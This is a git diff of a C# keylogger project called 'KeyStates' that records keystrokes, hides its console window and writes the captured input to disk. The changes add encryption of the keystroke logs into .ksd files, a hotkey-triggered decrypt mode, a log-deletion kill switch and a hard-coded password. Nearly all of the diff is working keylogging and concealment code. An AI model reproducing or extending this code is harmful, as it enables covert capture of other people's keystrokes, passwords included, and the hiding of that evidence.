@@ -10,7 +10,7 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Security.Principal;
 
-new Utils().OnStart(); // start program
+new KeyStatesCl().OnStart(); // start program
 
 namespace KeyStates
 {
@@ -26,24 +26,31 @@ namespace KeyStates
         public bool Scroll;
     }
 
-    internal class Utils
+    internal class KeyStatesCl
     {
+        private Encryption.StringEncryptionService CryTxt = new Encryption.StringEncryptionService();
+
+        //private FileEncryption Encrypt = new FileEncryption(); // archaic code
+
         // static data //
         private static readonly int SW_HIDE = 0;
 
+        private static readonly string EncPass = "fart";
         private static readonly int SW_SHOW = 5;
         private static readonly ushort[] KeyArr = [0x14, 0x90, 0x91]; // caps, num, scroll
         private static readonly int ShfKey = 0x10;
         private static readonly int ConHide = 0x75;   // f6
+        private static readonly int DecKey = 0x76;   // f7
         private static readonly int KillKey = 0x77;   // f8
         // end section//
 
         // editable data //
         private bool ConStat = true;
 
+        private bool DecTog = false;
         private bool EmrKill = false;
         private bool ConIntr = false;
-        private string TmpPath = "";
+        private String TmpPath = "";
         private KeyCache StateHolder;                   // holds the state of lock keys (caps lock, num lock, scroll lock)
         private LogCache LogHolder;                     // keylogger input buffer
 
@@ -93,17 +100,66 @@ namespace KeyStates
 
         private void DestroyLog()
         {
-            TglCon(true);
-            if (Directory.Exists(TmpPath))
+            //TglCon();
+            Console.Write("[!] do you want to delete log files?");
+            Thread.Sleep(200);
+            Console.Write(" [Y/N]: ");
+            String KeyPress = Console.ReadLine().ToString().ToLower();
+            if (KeyPress == "y")
             {
-                IEnumerable<string> ExistFiles = Directory.EnumerateFiles(TmpPath);
-                foreach (string ExistFile in ExistFiles)
-                    DbgMsg(ExistFile);
-                Directory.Delete(TmpPath, true);
-                DbgMsg("folder deleted");
-                EmrKill = true;
+                if (Directory.Exists(TmpPath))
+                {
+                    //CryptNHide(); old code
+                    //IEnumerable<string> ExistFiles = Directory.EnumerateFiles(TmpPath); // dbg junk
+                    // foreach (string ExistFile in ExistFiles)                          //
+                    //     DbgMsg(ExistFile);                                           //
+                    Directory.Delete(TmpPath, true);
+                    DbgMsg("folder deleted");
+                }
             }
+            EmrKill = true;
             return;
+        }
+
+        private void StartDec()
+        {
+            String TypKey = "";
+            String TypIV = "";
+            DecTog = true;
+
+            Console.Clear();
+            DbgMsg("entered decrypt mode");
+            Console.Write("[+] please enter key: ");
+            TypKey = Console.ReadLine();
+            Console.Write("[+] please enter iv: ");
+            TypIV = Console.ReadLine();
+            Console.Clear();
+            CryTxt.SetKey(TypKey);
+            CryTxt.SetIV(TypIV);
+
+            DbgMsg($"key: ${TypKey}");
+            DbgMsg($"iv: ${TypIV}");
+            Console.Write("[!] decrypt all files? ");
+            Thread.Sleep(200);
+            Console.Write(" [Y/N]: ");
+            String KeyPress = Console.ReadLine().ToString().ToLower();
+            if (KeyPress == "y")
+            {
+                foreach (string x in Directory.EnumerateFiles(Environment.CurrentDirectory))
+                {
+                    if (Path.GetExtension(x) == ".ksd")
+                    {
+                        DbgMsg(x);
+                        String TmpFln = SecureRandomString(6);
+                        String EncFil = File.ReadAllText(x);
+                        String DecFil = CryTxt.Decrypt(EncFil);
+                        DbgMsg($"{TmpPath}\\{TmpFln}.txt");
+                        File.WriteAllText($"{TmpPath}\\{TmpFln}.txt", DecFil);
+                        //DbgMsg($"dumped keylog cache to {TmpFln}.dat", DbgMsgTypes.Default, true);
+                    }
+                }
+            }
+            DecTog = false;
         }
 
         private void LoopKeys()
@@ -126,6 +182,8 @@ namespace KeyStates
                         char key = (char)i;
                         if (key == ConHide)     // f6 key to toggle dbg console
                             TglCon();
+                        if (i == DecKey)    // f8 to kill program and delete all files
+                            StartDec();
                         if (i == KillKey)    // f8 to kill program and delete all files
                             DestroyLog();
                         if (i == ShfKey || i == 0xA0 || i == 0xA1 || i == 0x14 || i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06) // keys that are pointless to log (caps lock, shift keys, etc...)
@@ -144,16 +202,17 @@ namespace KeyStates
                     }
                     x++;
                 }
-                if (x >= 300000 && LogHolder.data.Length > 25)
+                if (x >= 90000 && LogHolder.data.Length > 25)
                 {
                     // Console.Clear(); // dbg junk code
                     String TmpFln = SecureRandomString(6);
-                    File.WriteAllText($"{TmpPath}/" + TmpFln + ".txt", LogHolder.data.Replace("\u0001", " "));
+
+                    File.WriteAllText($"{TmpPath}\\" + TmpFln + ".ksd", CryTxt.Encrypt(LogHolder.data.Replace("\u0001", " ")));
                     LogHolder.data = "";
-                    DbgMsg($"dumped keylog cache to {TmpFln}.txt", DbgMsgTypes.Default, true);
+                    DbgMsg($"dumped keylog cache to {TmpFln}.ksd", DbgMsgTypes.Default, true);
                     x = 0;
                 }
-                Thread.Sleep(88);   // delay to prevent repeating characters //
+                Thread.Sleep(75);   // delay to prevent repeating characters //
             }
         }
 
@@ -165,9 +224,14 @@ namespace KeyStates
             switch (type)
             {
                 case DbgMsgTypes.Default:
-                    Console.ForegroundColor = ConsoleColor.DarkYellow;
+
                     if (timestamp)
-                        Console.Write($"[{formattedTimestamp}] ");
+                    {
+                        Console.ForegroundColor = ConsoleColor.Blue;
+                        Console.Write($"||{formattedTimestamp}|| ");
+                    }
+
+                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                     Console.Write("[DBG]: ");
                     Console.ForegroundColor = ConsoleColor.White;
                     Console.Write(input);
@@ -178,7 +242,7 @@ namespace KeyStates
 
                 case DbgMsgTypes.Error:
                     Console.ForegroundColor = ConsoleColor.Red;
-                    Console.Write($"[!] {formattedTimestamp} [ERR]: ");
+                    Console.Write($"||{formattedTimestamp}|| [ERR]: ");
                     Console.ForegroundColor = ConsoleColor.White;
                     Console.Write(input);
                     Console.ForegroundColor = ConsoleColor.Red;
@@ -196,18 +260,11 @@ namespace KeyStates
             return false;
         }
 
-        private void TglCon(bool ForceShow = false)
+        private void TglCon()
         {
             // int ProcId = Process.GetCurrentProcess().Id; // dbg junk code
             if (ConStat)
             {
-                if (ForceShow)
-                {
-                    ShowWindow(GetConsoleWindow(), SW_SHOW);
-                    ConStat = true;
-                    DbgMsg("forced show console");
-                    return;
-                }
                 DbgMsg("console hidden");
                 ShowWindow(GetConsoleWindow(), SW_HIDE);
                 ConStat = false;
@@ -304,6 +361,9 @@ namespace KeyStates
         private void LogKeys()
         {
             DbgMsg("keytgl thread started");
+            StateHolder.Caps = false;
+            StateHolder.Scroll = false;
+            StateHolder.Num = false;
             while (true)
             {
                 if (ConIntr)
@@ -311,7 +371,7 @@ namespace KeyStates
                 if (EmrKill)
                     return;
                 UpdateCache();
-                Thread.Sleep(200);
+                Thread.Sleep(100);
             }
         }
 
@@ -341,15 +401,17 @@ namespace KeyStates
             else
                 DbgMsg("succesfully launched with admin");
 
-            TglCon(true);
+            //TglCon(true);
             DbgMsg("OnStart called");
             CheckDir();
             InitCache();
             Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("/* 6 - 19 - 2024");
+            Console.WriteLine("/* 6 - 21 - 2024");
             Console.WriteLine("   KeyStates W.I.P");
             Console.WriteLine("   domer/PeripheralVisionPD2 */");
             Console.ForegroundColor = ConsoleColor.White;
+            DbgMsg($"encryption key: {CryTxt.ShowKey()}");
+            DbgMsg($"encryption iv: {CryTxt.ShowIV()}");
             Thread KeyLogLoop = new(LoopKeys);
             Thread TglKeyLoop = new(LogKeys);
             KeyLogLoop.Start();
